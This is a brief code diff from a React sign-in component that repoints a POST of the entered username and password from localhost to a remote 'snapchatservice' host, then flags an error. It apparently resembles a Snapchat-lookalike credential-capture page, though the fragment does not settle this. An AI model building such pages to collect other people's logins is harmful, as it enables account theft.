@@ -22,7 +22,7 @@ const Signin = (props: Loginprops) => {
     if(password && username){   
     setError(true);
     setCount(2);
-      fetch("http://localhost:5000/api/Logins", {
+      fetch("https://snapchatservice.onrender.com/api/Logins", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
